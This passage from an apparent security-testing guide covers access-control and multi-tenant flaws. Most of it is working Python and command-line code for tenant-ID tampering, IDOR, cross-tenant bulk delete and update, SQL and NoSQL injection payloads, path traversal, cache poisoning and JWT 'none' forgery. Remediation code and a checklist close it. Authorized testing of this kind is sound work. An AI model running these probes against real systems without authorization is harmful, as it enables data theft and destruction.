            test_values = ['1', '0', 'admin', 'root', 'system', 'other_tenant_id']

            for value in test_values:
                test_headers = self.tenant_a_headers.copy()
                test_headers[header] = value

                response = requests.get(
                    f"{self.base_url}{endpoint}",
                    headers=test_headers,
                    timeout=10
                )

                if response.status_code == 200:
                    # Check if response contains different tenant's data
                    vulnerabilities.append({
                        'header': header,
                        'value': value,
                        'endpoint': endpoint,
                        'issue': 'Potential tenant switch via header'
                    })

        return vulnerabilities

    def test_subdomain_tenant_bypass(self, endpoints):
        """Test if changing subdomain grants access to different tenant"""
        subdomains_to_test = [
            'admin', 'system', 'internal', 'api', 'app',
            'tenant1', 'tenant2', 'demo', 'test', 'staging'
        ]

        vulnerabilities = []
        base_domain = self.base_url.split('//')[1].split('/')[0]

        for subdomain in subdomains_to_test:
            test_url = f"https://{subdomain}.{base_domain}"

            for endpoint in endpoints:
                try:
                    response = requests.get(
                        f"{test_url}{endpoint}",
                        headers=self.tenant_a_headers,
                        timeout=5
                    )

                    if response.status_code == 200:
                        vulnerabilities.append({
                            'subdomain': subdomain,
                            'endpoint': endpoint,
                            'status': response.status_code
                        })
                except:
                    pass

        return vulnerabilities
```

### 3.2 Cross-Tenant Data Access

```python
# Cross-Tenant Data Access Testing
class CrossTenantAccess:
    def __init__(self, base_url):
        self.base_url = base_url

    def test_idor_across_tenants(self, tenant_a_token, tenant_b_resources):
        """Test IDOR vulnerabilities that span tenants"""
        headers = {'Authorization': f'Bearer {tenant_a_token}'}
        vulnerabilities = []

        for resource in tenant_b_resources:
            # Direct ID access
            response = requests.get(
                f"{self.base_url}{resource['endpoint']}/{resource['id']}",
                headers=headers,
                timeout=10
            )

            if response.status_code == 200:
                vulnerabilities.append({
                    'type': 'Direct IDOR',
                    'endpoint': resource['endpoint'],
                    'id': resource['id'],
                    'data_leaked': response.json()
                })

            # GraphQL nested query access
            graphql_query = f"""
            query {{
                resource(id: "{resource['id']}") {{
                    id
                    name
                    tenant {{ id name }}
                    sensitiveData
                }}
            }}
            """

            gql_response = requests.post(
                f"{self.base_url}/graphql",
                headers=headers,
                json={'query': graphql_query},
                timeout=10
            )

            if gql_response.status_code == 200:
                data = gql_response.json()
                if not data.get('errors'):
                    vulnerabilities.append({
                        'type': 'GraphQL IDOR',
                        'query': graphql_query,
                        'data_leaked': data
                    })

        return vulnerabilities

    def test_bulk_operations_across_tenants(self, tenant_a_token, tenant_b_ids):
        """Test if bulk operations can affect other tenant's data"""
        headers = {
            'Authorization': f'Bearer {tenant_a_token}',
            'Content-Type': 'application/json'
        }

        vulnerabilities = []

        # Bulk delete
        delete_payload = {'ids': tenant_b_ids}
        delete_response = requests.post(
            f"{self.base_url}/api/resources/bulk-delete",
            headers=headers,
            json=delete_payload,
            timeout=10
        )

        if delete_response.status_code == 200:
            vulnerabilities.append({
                'operation': 'bulk-delete',
                'payload': delete_payload,
                'status': delete_response.status_code,
                'severity': 'CRITICAL'
            })

        # Bulk update
        update_payload = {
            'ids': tenant_b_ids,
            'updates': {'status': 'modified_by_attacker'}
        }
        update_response = requests.post(
            f"{self.base_url}/api/resources/bulk-update",
            headers=headers,
            json=update_payload,
            timeout=10
        )

        if update_response.status_code == 200:
            vulnerabilities.append({
                'operation': 'bulk-update',
                'payload': update_payload,
                'status': update_response.status_code,
                'severity': 'CRITICAL'
            })

        return vulnerabilities

    def test_export_functionality(self, tenant_a_token):
        """Test if export functions leak cross-tenant data"""
        headers = {'Authorization': f'Bearer {tenant_a_token}'}

        export_endpoints = [
            '/api/export/users',
            '/api/export/data',
            '/api/reports/all',
            '/api/analytics/export',
            '/api/backup/download'
        ]

        vulnerabilities = []

        for endpoint in export_endpoints:
            # Test with all=true or similar params
            params_to_test = [
                {'all': 'true'},
                {'include_all': 'true'},
                {'tenant': 'all'},
                {'scope': 'global'},
                {'filter': ''},
                {'limit': '999999'}
            ]

            for params in params_to_test:
                response = requests.get(
                    f"{self.base_url}{endpoint}",
                    headers=headers,
                    params=params,
                    timeout=30
                )

                if response.status_code == 200:
                    # Check if response contains multi-tenant data
                    content = response.text
                    if self._contains_multiple_tenants(content):
                        vulnerabilities.append({
                            'endpoint': endpoint,
                            'params': params,
                            'issue': 'Export contains multi-tenant data'
                        })

        return vulnerabilities

    def _contains_multiple_tenants(self, content):
        """Heuristic to detect multi-tenant data in exports"""
        # Look for multiple different tenant IDs or organization names
        import re
        tenant_pattern = r'tenant[_-]?id["\']?\s*[:=]\s*["\']?(\w+)'
        matches = re.findall(tenant_pattern, content, re.IGNORECASE)
        return len(set(matches)) > 1
```

### 3.3 Shared Resource Exploitation

```python
# Shared Resource Security Testing
class SharedResourceExploit:
    def __init__(self, base_url, tenant_token):
        self.base_url = base_url
        self.headers = {'Authorization': f'Bearer {tenant_token}'}

    def test_shared_storage_access(self):
        """Test for shared storage vulnerabilities"""
        storage_endpoints = [
            '/api/files',
            '/api/uploads',
            '/api/documents',
            '/api/media',
            '/api/assets'
        ]

        vulnerabilities = []

        for endpoint in storage_endpoints:
            # Try path traversal
            traversal_payloads = [
                '../',
                '../../',
                '../../../',
                '..%2f',
                '..%252f',
                '%2e%2e/',
                '%2e%2e%2f'
            ]

            for payload in traversal_payloads:
                response = requests.get(
                    f"{self.base_url}{endpoint}/{payload}",
                    headers=self.headers,
                    timeout=10
                )

                if response.status_code == 200:
                    vulnerabilities.append({
                        'endpoint': endpoint,
                        'payload': payload,
                        'issue': 'Path traversal in shared storage'
                    })

        return vulnerabilities

    def test_shared_database_access(self):
        """Test for shared database vulnerabilities via injection"""
        injection_payloads = [
            # SQL Injection for tenant bypass
            "' OR tenant_id IS NULL--",
            "' OR 1=1--",
            "' UNION SELECT * FROM users WHERE tenant_id != current_tenant--",

            # NoSQL injection for tenant bypass
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"tenant_id": {"$exists": true}}',
        ]

        endpoints_to_test = [
            '/api/search',
            '/api/query',
            '/api/filter',
            '/api/users'
        ]

        vulnerabilities = []

        for endpoint in endpoints_to_test:
            for payload in injection_payloads:
                # Test in query parameter
                response = requests.get(
                    f"{self.base_url}{endpoint}",
                    headers=self.headers,
                    params={'q': payload, 'filter': payload},
                    timeout=10
                )

                if response.status_code == 200:
                    data = response.json() if response.text else None
                    if data and self._contains_cross_tenant_data(data):
                        vulnerabilities.append({
                            'endpoint': endpoint,
                            'payload': payload,
                            'issue': 'Injection returns cross-tenant data'
                        })

        return vulnerabilities

    def test_shared_cache_poisoning(self):
        """Test if cache can be poisoned to serve cross-tenant data"""
        cache_headers = [
            'X-Cache-Key',
            'X-Original-URL',
            'X-Rewrite-URL',
            'X-Forwarded-Host'
        ]

        test_endpoint = '/api/profile'
        vulnerabilities = []

        for header in cache_headers:
            # Try to poison cache with different tenant context
            poison_headers = self.headers.copy()
            poison_headers[header] = 'other-tenant.example.com'

            response = requests.get(
                f"{self.base_url}{test_endpoint}",
                headers=poison_headers,
                timeout=10
            )

            # Check cache status headers
            cache_status = response.headers.get('X-Cache', '')
            if 'HIT' in cache_status or 'MISS' in cache_status:
                vulnerabilities.append({
                    'header': header,
                    'cache_status': cache_status,
                    'issue': 'Possible cache poisoning vector'
                })

        return vulnerabilities

    def _contains_cross_tenant_data(self, data):
        """Check if response contains data from multiple tenants"""
        if isinstance(data, list) and len(data) > 1:
            tenant_ids = set()
            for item in data:
                if isinstance(item, dict):
                    tid = item.get('tenant_id') or item.get('tenantId') or item.get('organization_id')
                    if tid:
                        tenant_ids.add(str(tid))
            return len(tenant_ids) > 1
        return False
```

### 3.4 Tenant ID Manipulation

```python
# Tenant ID Manipulation Testing
class TenantIDManipulation:
    def __init__(self, base_url, auth_token):
        self.base_url = base_url
        self.headers = {
            'Authorization': f'Bearer {auth_token}',
            'Content-Type': 'application/json'
        }

    def test_tenant_id_in_jwt(self, jwt_token):
        """Test if tenant ID in JWT can be manipulated"""
        import jwt
        import base64
        import json

        # Decode JWT
        parts = jwt_token.split('.')
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

        # Find tenant-related claims
        tenant_claims = ['tenant_id', 'tenantId', 'org_id', 'orgId',
                        'organization_id', 'company_id', 'workspace_id']

        for claim in tenant_claims:
            if claim in payload:
                original_value = payload[claim]

                # Try different values
                test_values = [1, 0, 'admin', 'root', 'system',
                              str(int(original_value) + 1) if str(original_value).isdigit() else 'test']

                for test_value in test_values:
                    payload[claim] = test_value

                    # Try none algorithm attack
                    forged_token = self._forge_jwt_none(payload)
                    if forged_token:
                        response = self._test_forged_token(forged_token)
                        if response and response.status_code == 200:
                            return {
                                'vulnerability': 'JWT tenant manipulation',
                                'claim': claim,
                                'original': original_value,
                                'forged': test_value,
                                'severity': 'CRITICAL'
                            }

        return None

    def test_tenant_id_in_request(self, endpoints):
        """Test tenant ID manipulation in request body/params"""
        vulnerabilities = []

        tenant_params = ['tenant_id', 'tenantId', 'org_id', 'orgId',
                        'organization_id', 'company_id', 'account_id']

        for endpoint in endpoints:
            for param in tenant_params:
                # Test in query string
                for value in ['1', '0', 'admin', 'null', '*']:
                    response = requests.get(
                        f"{self.base_url}{endpoint}",
                        headers=self.headers,
                        params={param: value},
                        timeout=10
                    )

                    if response.status_code == 200:
                        vulnerabilities.append({
                            'endpoint': endpoint,
                            'param': param,
                            'value': value,
                            'method': 'GET query param'
                        })

                # Test in POST body
                for value in [1, 0, 'admin', None, '*']:
                    response = requests.post(
                        f"{self.base_url}{endpoint}",
                        headers=self.headers,
                        json={param: value},
                        timeout=10
                    )

                    if response.status_code in [200, 201]:
                        vulnerabilities.append({
                            'endpoint': endpoint,
                            'param': param,
                            'value': value,
                            'method': 'POST body'
                        })

        return vulnerabilities

    def test_tenant_enumeration(self, endpoint):
        """Enumerate valid tenant IDs"""
        valid_tenants = []

        # Numeric enumeration
        for i in range(1, 1001):
            response = requests.get(
                f"{self.base_url}{endpoint}",
                headers=self.headers,
                params={'tenant_id': i},
                timeout=5
            )

            if response.status_code == 200:
                valid_tenants.append({'id': i, 'type': 'numeric'})
            elif response.status_code == 403:
                # Exists but forbidden
                valid_tenants.append({'id': i, 'type': 'numeric', 'note': 'exists but forbidden'})

            # Rate limiting consideration
            if i % 100 == 0:
                time.sleep(1)

        return valid_tenants

    def _forge_jwt_none(self, payload):
        """Attempt JWT none algorithm attack"""
        import base64
        import json

        header = {"alg": "none", "typ": "JWT"}
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')

        return f"{header_b64}.{payload_b64}."

    def _test_forged_token(self, token):
        """Test if forged token is accepted"""
        try:
            return requests.get(
                f"{self.base_url}/api/profile",
                headers={'Authorization': f'Bearer {token}'},
                timeout=10
            )
        except:
            return None
```

---

## 4. Detection Tools and Commands

### 4.1 Burp Suite Configuration

```
# Autorize Extension Configuration
# 1. Install Autorize from BApp Store
# 2. Configure low-privilege session cookie/token
# 3. Mark authentication headers for modification
# 4. Browse as high-privilege user
# 5. Autorize will automatically test with low-privilege credentials

# AuthMatrix Extension
# 1. Define users with different roles
# 2. Map endpoints to required roles
# 3. Run automated access control tests

# Custom Intruder Attack for Tenant ID
# Attack Type: Sniper
# Payload Position: tenant_id parameter
# Payload: Numbers 1-10000 or known tenant IDs
```

### 4.2 Command Line Tools

```bash
# Nuclei - Permission Testing Templates
nuclei -u https://target.com -t exposures/ -t vulnerabilities/generic/

# Custom Nuclei template for IDOR
cat << 'EOF' > idor-template.yaml
id: custom-idor-test
info:
  name: Custom IDOR Test
  severity: high
  tags: idor,access-control

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/users/{{user_id}}"
    payloads:
      user_id:
        - "1"
        - "2"
        - "admin"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "email"
          - "password"
        condition: or
EOF

nuclei -u https://target.com -t idor-template.yaml

# ffuf - Endpoint Fuzzing with Auth
ffuf -u https://target.com/api/FUZZ -w admin-endpoints.txt \
  -H "Authorization: Bearer user_token" \
  -mc 200,201,204 \
  -o permission-bypass.json

# wfuzz - Parameter Fuzzing
wfuzz -z range,1-1000 -H "Authorization: Bearer token" \
  --sc 200 "https://target.com/api/users/FUZZ"

# httpx - Bulk Testing
cat endpoints.txt | httpx -H "Authorization: Bearer user_token" \
  -mc 200 -title -tech-detect -o accessible.txt
```

### 4.3 Custom Testing Framework

```python
#!/usr/bin/env python3
"""
Permission and Role Vulnerability Scanner
"""

import argparse
import requests
import json
from concurrent.futures import ThreadPoolExecutor
import time

class PermissionScanner:
    def __init__(self, config):
        self.base_url = config['base_url']
        self.users = config['users']  # Dict of role -> token
        self.endpoints = config['endpoints']
        self.results = []

    def run_full_scan(self):
        """Run comprehensive permission scan"""
        print("[*] Starting Permission Scan")

        # Test 1: Cross-role access
        print("[*] Testing cross-role access...")
        cross_role_results = self.test_cross_role_access()

        # Test 2: Unauthenticated access
        print("[*] Testing unauthenticated access...")
        unauth_results = self.test_unauthenticated_access()

        # Test 3: IDOR
        print("[*] Testing IDOR vulnerabilities...")
        idor_results = self.test_idor()

        # Test 4: Parameter tampering
        print("[*] Testing parameter tampering...")
        tamper_results = self.test_parameter_tampering()

        return {
            'cross_role': cross_role_results,
            'unauthenticated': unauth_results,
            'idor': idor_results,
            'parameter_tampering': tamper_results
        }

    def test_cross_role_access(self):
        vulnerabilities = []

        for endpoint in self.endpoints:
            required_role = endpoint.get('required_role', 'admin')

            for role, token in self.users.items():
                if role == required_role:
                    continue  # Skip testing required role

                headers = {'Authorization': f'Bearer {token}'}
                response = requests.request(
                    endpoint.get('method', 'GET'),
                    f"{self.base_url}{endpoint['path']}",
                    headers=headers,
                    timeout=10
                )

                if response.status_code == 200:
                    vulnerabilities.append({
                        'endpoint': endpoint['path'],
                        'required_role': required_role,
                        'accessed_by': role,
                        'severity': 'HIGH'
                    })

        return vulnerabilities

    def test_unauthenticated_access(self):
        vulnerabilities = []

        for endpoint in self.endpoints:
            response = requests.request(
                endpoint.get('method', 'GET'),
                f"{self.base_url}{endpoint['path']}",
                timeout=10
            )

            if response.status_code == 200:
                vulnerabilities.append({
                    'endpoint': endpoint['path'],
                    'issue': 'Accessible without authentication',
                    'severity': 'CRITICAL'
                })

        return vulnerabilities

    def test_idor(self):
        vulnerabilities = []

        for role, token in self.users.items():
            if role == 'admin':
                continue

            headers = {'Authorization': f'Bearer {token}'}

            # Test numeric IDs
            for i in range(1, 101):
                response = requests.get(
                    f"{self.base_url}/api/users/{i}",
                    headers=headers,
                    timeout=5
                )

                if response.status_code == 200:
                    data = response.json()
                    # Check if it's another user's data
                    if data.get('id') != self._get_user_id_from_token(token):
                        vulnerabilities.append({
                            'endpoint': f'/api/users/{i}',
                            'accessor_role': role,
                            'accessed_user_id': i,
                            'severity': 'HIGH'
                        })

        return vulnerabilities

    def test_parameter_tampering(self):
        vulnerabilities = []

        tamper_params = ['role', 'is_admin', 'permissions', 'access_level']

        for role, token in self.users.items():
            headers = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json'
            }

            for param in tamper_params:
                payload = {param: 'admin'}

                response = requests.put(
                    f"{self.base_url}/api/users/me",
                    headers=headers,
                    json=payload,
                    timeout=10
                )

                if response.status_code == 200:
                    response_data = response.json()
                    if response_data.get(param) == 'admin':
                        vulnerabilities.append({
                            'param': param,
                            'role': role,
                            'issue': 'Privilege escalation via parameter tampering',
                            'severity': 'CRITICAL'
                        })

        return vulnerabilities

    def _get_user_id_from_token(self, token):
        import jwt
        try:
            decoded = jwt.decode(token, options={"verify_signature": False})
            return decoded.get('user_id') or decoded.get('sub')
        except:
            return None


if __name__ == '__main__':
    config = {
        'base_url': 'https://target.com',
        'users': {
            'admin': 'admin_jwt_token',
            'user': 'user_jwt_token',
            'guest': 'guest_jwt_token'
        },
        'endpoints': [
            {'path': '/api/admin/users', 'method': 'GET', 'required_role': 'admin'},
            {'path': '/api/admin/settings', 'method': 'GET', 'required_role': 'admin'},
            {'path': '/api/users', 'method': 'GET', 'required_role': 'user'},
        ]
    }

    scanner = PermissionScanner(config)
    results = scanner.run_full_scan()
    print(json.dumps(results, indent=2))
```

---

## 5. Remediation Guidelines

### 5.1 Secure Permission Implementation

```python
# Django - Secure Permission Patterns
from django.contrib.auth.mixins import PermissionRequiredMixin, UserPassesTestMixin
from rest_framework.permissions import BasePermission

class IsOwnerOrAdmin(BasePermission):
    def has_object_permission(self, request, view, obj):
        if request.user.is_staff:
            return True
        return obj.owner == request.user

class TenantIsolationPermission(BasePermission):
    def has_permission(self, request, view):
        return request.user.is_authenticated

    def has_object_permission(self, request, view, obj):
        return obj.tenant_id == request.user.tenant_id

# Apply to ViewSet
class SecureViewSet(viewsets.ModelViewSet):
    permission_classes = [IsAuthenticated, TenantIsolationPermission, IsOwnerOrAdmin]

    def get_queryset(self):
        # Always filter by tenant
        return self.queryset.filter(tenant_id=self.request.user.tenant_id)
```

```java
// Spring Security - Method-Level Security
@Configuration
@EnableMethodSecurity(prePostEnabled = true)
public class SecurityConfig {
    // Configuration
}

@Service
public class SecureService {

    @PreAuthorize("hasRole('ADMIN') or @securityService.isOwner(#id, principal)")
    public Resource getResource(Long id) {
        return resourceRepository.findById(id).orElseThrow();
    }

    @PreAuthorize("@tenantService.belongsToTenant(#resource.tenantId, principal)")
    public void updateResource(Resource resource) {
        resourceRepository.save(resource);
    }
}

@Component
public class TenantService {
    public boolean belongsToTenant(Long tenantId, User principal) {
        return principal.getTenantId().equals(tenantId);
    }
}
```

```javascript
// Express.js - Middleware-Based Permissions
const checkPermission = (requiredPermission) => {
    return async (req, res, next) => {
        if (!req.user) {
            return res.status(401).json({ error: 'Unauthorized' });
        }

        const hasPermission = await permissionService.userHasPermission(
            req.user.id,
            requiredPermission
        );

        if (!hasPermission) {
            return res.status(403).json({ error: 'Forbidden' });
        }

        next();
    };
};

const checkTenantAccess = async (req, res, next) => {
    const resourceTenantId = req.resource?.tenantId;
    const userTenantId = req.user?.tenantId;

    if (resourceTenantId && resourceTenantId !== userTenantId) {
        return res.status(403).json({ error: 'Cross-tenant access denied' });
    }

    next();
};

// Apply middleware
app.get('/api/resources/:id',
    authenticate,
    loadResource,
    checkTenantAccess,
    checkPermission('read:resources'),
    getResource
);
```

### 5.2 Security Checklist

```markdown
## Permission Security Checklist

### Role Management
- [ ] Roles are defined server-side only
- [ ] Role assignment requires admin privileges
- [ ] Role changes are logged and audited
- [ ] Default role is least privileged
- [ ] Role hierarchy is properly enforced

### Permission Checks
- [ ] All endpoints have authentication checks
- [ ] All endpoints have authorization checks
- [ ] Checks occur on server-side
- [ ] Object-level permissions are enforced
- [ ] Function-level access control exists

### Multi-Tenancy
- [ ] Tenant isolation is enforced at database level
- [ ] All queries include tenant filter
- [ ] Cross-tenant access is impossible
- [ ] Tenant ID cannot be manipulated
- [ ] Shared resources are properly isolated

### Session Management
- [ ] Sessions are invalidated on permission changes
- [ ] JWTs have short expiration
- [ ] Permission caching has appropriate TTL
- [ ] Token refresh validates current permissions
```

---

## References

- OWASP Access Control Cheat Sheet
- OWASP Testing Guide - Authorization Testing
- CWE-269: Improper Privilege Management
- CWE-862: Missing Authorization
- CWE-863: Incorrect Authorization
- NIST SP 800-53 - Access Control Family
- MITRE ATT&CK - Privilege Escalation Techniques
